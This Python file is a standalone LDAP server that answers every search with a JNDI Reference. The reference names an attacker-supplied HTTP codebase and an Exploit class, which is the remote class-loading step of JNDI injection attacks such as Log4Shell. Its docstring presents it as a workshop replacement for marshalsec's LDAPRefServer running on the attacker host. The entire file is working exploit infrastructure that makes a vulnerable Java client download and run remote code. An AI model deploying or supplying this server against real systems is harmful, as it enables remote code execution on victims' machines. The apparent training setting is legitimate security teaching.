#!/usr/bin/env python3
"""Minimal LDAP server returning a JNDI Reference (javaCodeBase + javaFactory).

Workshop substitute for marshalsec LDAPRefServer — no Java required on the
attacker host. Pair with a simple HTTP server hosting Exploit.class.

  python3 tools/ldap-ref-server.py --codebase http://127.0.0.1:8000/ --port 1389
"""
from __future__ import annotations

import argparse
import socket
import struct
import threading
from datetime import datetime, timezone


def ber_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    if n < 0x100:
        return bytes([0x81, n])
    return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])


def ber_octet_string(s: str | bytes) -> bytes:
    raw = s.encode() if isinstance(s, str) else s
    return b"\x04" + ber_len(len(raw)) + raw


def ber_sequence(tag: int, *parts: bytes) -> bytes:
    body = b"".join(parts)
    return bytes([tag]) + ber_len(len(body)) + body


def ber_enumerated(v: int) -> bytes:
    return b"\x0a\x01" + bytes([v & 0xFF])


def ber_integer(v: int) -> bytes:
    if v == 0:
        return b"\x02\x01\x00"
    chunks = []
    n = v
    while n:
        chunks.append(n & 0xFF)
        n >>= 8
    if chunks[-1] & 0x80:
        chunks.append(0)
    body = bytes(reversed(chunks))
    return b"\x02" + ber_len(len(body)) + body


def parse_message_id(data: bytes) -> int:
    # Best-effort: LDAPMessage ::= SEQUENCE { messageID INTEGER, ... }
    try:
        if data[0] != 0x30:
            return 1
        i = 2 if data[1] < 0x80 else 2 + (data[1] & 0x7F)
        if data[i] != 0x02:
            return 1
        ln = data[i + 1]
        raw = data[i + 2 : i + 2 + ln]
        return int.from_bytes(raw, "big")
    except Exception:
        return 1


def extract_base_dn(data: bytes) -> str:
    # Heuristic: first octet string after message id / protocol op often is baseObject.
    try:
        idx = data.find(b"\x04")
        while idx != -1 and idx + 1 < len(data):
            ln = data[idx + 1]
            if ln < 0x80 and idx + 2 + ln <= len(data):
                val = data[idx + 2 : idx + 2 + ln]
                if val and all(32 <= b < 127 for b in val):
                    return val.decode()
            idx = data.find(b"\x04", idx + 1)
    except Exception:
        pass
    return "Exploit"


def build_search_result_entry(msg_id: int, dn: str, codebase: str, classname: str) -> bytes:
    # Ensure codebase ends with /
    if not codebase.endswith("/"):
        codebase = codebase + "/"

    attrs = ber_sequence(
        0x30,  # PartialAttributeList
        ber_sequence(
            0x30,
            ber_octet_string("javaClassName"),
            ber_sequence(0x31, ber_octet_string("foo")),
        ),
        ber_sequence(
            0x30,
            ber_octet_string("javaCodeBase"),
            ber_sequence(0x31, ber_octet_string(codebase)),
        ),
        ber_sequence(
            0x30,
            ber_octet_string("objectClass"),
            ber_sequence(0x31, ber_octet_string("javaNamingReference")),
        ),
        ber_sequence(
            0x30,
            ber_octet_string("javaFactory"),
            ber_sequence(0x31, ber_octet_string(classname)),
        ),
    )

    search_entry = ber_sequence(
        0x64,  # SearchResultEntry
        ber_octet_string(dn),
        attrs,
    )
    return ber_sequence(0x30, ber_integer(msg_id), search_entry)


def build_search_result_done(msg_id: int) -> bytes:
    done = ber_sequence(
        0x65,  # SearchResultDone
        ber_enumerated(0),  # success
        ber_octet_string(""),
        ber_octet_string(""),
    )
    return ber_sequence(0x30, ber_integer(msg_id), done)


def handle_client(conn: socket.socket, addr, codebase: str, classname: str) -> None:
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{ts}] LDAP connection from {addr[0]}:{addr[1]}", flush=True)
    try:
        data = conn.recv(65535)
        if not data:
            return
        msg_id = parse_message_id(data)
        dn = extract_base_dn(data) or classname
        print(f"         search base={dn!r} → {codebase}#{classname}", flush=True)
        conn.sendall(build_search_result_entry(msg_id, dn, codebase, classname))
        conn.sendall(build_search_result_done(msg_id))
    except Exception as exc:
        print(f"         error: {exc}", flush=True)
    finally:
        conn.close()


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=1389)
    parser.add_argument(
        "--codebase",
        required=True,
        help="HTTP codebase URL, e.g. http://127.0.0.1:8000/",
    )
    parser.add_argument("--class", dest="classname", default="Exploit")
    args = parser.parse_args()

    codebase = args.codebase
    if "#" in codebase:
        # Allow marshalsec-style http://host:8000/#Exploit
        codebase, _, cls = codebase.partition("#")
        if cls:
            args.classname = cls
    if not codebase.endswith("/"):
        codebase += "/"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((args.host, args.port))
    sock.listen(16)
    print(f"[*] LDAP ref server on {args.host}:{args.port}", flush=True)
    print(f"[*] javaCodeBase={codebase} javaFactory={args.classname}", flush=True)

    while True:
        conn, addr = sock.accept()
        threading.Thread(
            target=handle_client,
            args=(conn, addr, codebase, args.classname),
            daemon=True,
        ).start()


if __name__ == "__main__":
    main()
